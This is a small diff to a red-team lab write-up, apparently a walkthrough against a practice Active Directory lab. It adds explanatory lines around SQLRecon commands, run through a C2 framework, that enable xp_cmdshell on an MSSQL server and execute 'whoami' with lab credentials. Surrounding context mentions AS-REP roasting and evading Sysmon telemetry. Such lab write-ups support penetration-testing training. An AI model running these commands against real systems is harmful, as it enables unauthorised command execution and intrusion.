@@ -454,8 +454,6 @@ No prebuilt rule fires. The inline BOF produces zero Sysmon network telemetry on
 
 ---
 
----
-
 ## 3 - Credential Access
 
 ### 3.1 - AS-REP Roasting
@@ -1068,11 +1066,15 @@ SQL> xp_cmdshell whoami
 
 **C2 (SQLRecon via execute-assembly):**
 
+First, enable `xp_cmdshell` 
+
 ```
 execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:enablexp /i:sa
 ```
 
 ![SQLRecon enable xp_cmdshell](writeups/images/red-team-workflow/20260923161523.png)
+
+Then, execute a system command - `whoami`
 
 ```
 execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:xpcmd /i:sa /c:whoami
